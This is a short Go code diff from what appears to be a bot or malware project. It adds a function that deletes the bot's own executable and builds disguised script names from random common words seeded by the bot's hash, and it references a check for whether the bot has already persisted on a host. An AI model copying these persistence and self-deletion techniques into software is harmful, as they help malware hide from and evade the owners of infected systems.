@@ -5,15 +5,27 @@ import (
 	"time"
 )
 
+// Hash value of the bot's binary.
+var selfHash string
+
 // scriptNameBySelfHash generates a file name based on the bot's hash.
 func scriptNameBySelfHash() (string, error) {
-	// Hash of the bot's executable.
-	hash, err := hashSelf()
+	return randomPopularWordBySeed(integersFromString(selfHash)+512) + "_" + randomPopularWordBySeed(integersFromString(selfHash)+1024), nil
+}
+
+// removeBinary deletes the bot's binary file.
+func removeBinary() error {
+	selfPath, err := os.Executable()
 	if err != nil {
-		return "", err
+		return err
 	}
 
-	return randomPopularWordBySeed(integersFromString(hash)+512) + "_" + randomPopularWordBySeed(integersFromString(hash)+1024), nil
+	err = os.Remove(selfPath)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 // checkIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
